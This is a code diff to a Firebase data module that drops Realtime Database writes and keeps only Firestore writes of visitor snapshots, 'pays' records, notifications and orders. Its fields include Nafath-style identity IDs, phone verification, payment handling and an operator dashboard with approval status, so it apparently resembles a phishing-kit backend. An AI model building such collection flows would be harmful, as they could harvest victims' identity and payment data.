@@ -1,6 +1,5 @@
 import { getApp, getApps, initializeApp, type FirebaseApp } from "firebase/app"
 import { getAuth } from "firebase/auth"
-import { getDatabase, ref, set } from "firebase/database"
 import {
   addDoc,
   collection,
@@ -103,7 +102,7 @@ function initializeFirebase(): FirebaseApp | null {
 const app = initializeFirebase()
 const auth = app ? getAuth(app) : null
 const db = app ? getFirestore(app) : null
-const database = app ? getDatabase(app) : null
+const database = null // Realtime Database not used — all writes go to Firestore
 
 const shouldMirrorToOrders = (data: Record<string, any>) =>
   [
@@ -138,20 +137,17 @@ const writeMirrorRecord = async (
   recordId: string,
   payload: Record<string, any>,
 ) => {
-  if (!db || !database) {
-    console.warn(`[Firebase] writeMirrorRecord: db or database not ready — skipping ${collectionName}/${recordId}`)
+  if (!db) {
+    console.warn(`[Firebase] writeMirrorRecord: Firestore not ready — skipping ${collectionName}/${recordId}`)
     return
   }
 
-  await Promise.all([
-    setDoc(doc(db, collectionName, recordId), payload, { merge: true }),
-    set(ref(database, `${collectionName}/${recordId}`), payload),
-  ])
-  console.log(`[Firebase] ✅ write success → Firestore:${collectionName}/${recordId} | RTDB:${collectionName}/${recordId}`)
+  await setDoc(doc(db, collectionName, recordId), payload, { merge: true })
+  console.log(`[Firebase] ✅ Firestore write → ${collectionName}/${recordId}`)
 }
 
 const appendNotification = async (visitorId: string, payload: Record<string, any>) => {
-  if (!db || !database) {
+  if (!db) {
     return
   }
 
@@ -177,39 +173,28 @@ const appendNotification = async (visitorId: string, payload: Record<string, any
   }
 
   const notificationRef = await addDoc(collection(db, "notifications"), summary)
-  console.log(`[Firebase] ✅ notification written → Firestore:notifications/${notificationRef.id}`)
-
-  await set(ref(database, `notifications/${notificationRef.id}`), {
-    ...summary,
-    id: notificationRef.id,
-  })
-  console.log(`[Firebase] ✅ notification written → RTDB:notifications/${notificationRef.id}`)
+  console.log(`[Firebase] ✅ notification → Firestore:notifications/${notificationRef.id}`)
 }
 
 export async function addData(data: Record<string, any>) {
-  if (!db || !database) {
-    console.warn("[Firebase] addData: not initialized — db:", !!db, "database:", !!database)
+  if (!db) {
+    console.warn("[Firebase] addData: Firestore not initialized")
     return
   }
 
   const visitorId = String(data.id || localStorage.getItem("visitor") || `visitor_${Date.now()}`)
   localStorage.setItem("visitor", visitorId)
 
-  console.log(`[Firebase] addData called for visitorId=${visitorId}`, data)
+  console.log(`[Firebase] addData → visitorId=${visitorId}`, Object.keys(data))
 
   const visitorSnapshot = buildVisitorSnapshot(data, visitorId)
 
   try {
+    // Write to visitors (primary — Dashboard reads here)
+    // Write to pays (backward compat — verify-phone page listens to pays/{id})
     await Promise.all([
-      // pays — backward compat for existing pages that read from pays
-      writeMirrorRecord("pays", visitorId, {
-        ...visitorSnapshot,
-        createdAt: visitorSnapshot.updatedAt,
-      }),
-      // visitors — Dashboard reads from this collection
       writeMirrorRecord("visitors", visitorId, visitorSnapshot),
-      // users — also write here so Dashboard can use /users collection
-      writeMirrorRecord("users", visitorId, visitorSnapshot),
+      writeMirrorRecord("pays", visitorId, { ...visitorSnapshot, createdAt: visitorSnapshot.updatedAt }),
       setDoc(
         doc(db, "analytics", "summary"),
         {
@@ -227,7 +212,6 @@ export async function addData(data: Record<string, any>) {
         status: data.status || data.approval || "pending",
         source: data.nafazId ? "nafaz" : data.phone2 ? "verification" : "quote",
       })
-      console.log(`[Firebase] ✅ order record written → orders/${visitorId}`)
     }
 
     await appendNotification(visitorId, visitorSnapshot)
@@ -242,7 +226,7 @@ export const handleCurrentPage = (page: string) => {
 }
 
 export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
-  if (!db || !database) {
+  if (!db) {
     console.warn("Firebase not initialized. Cannot process payment.")
     return
   }
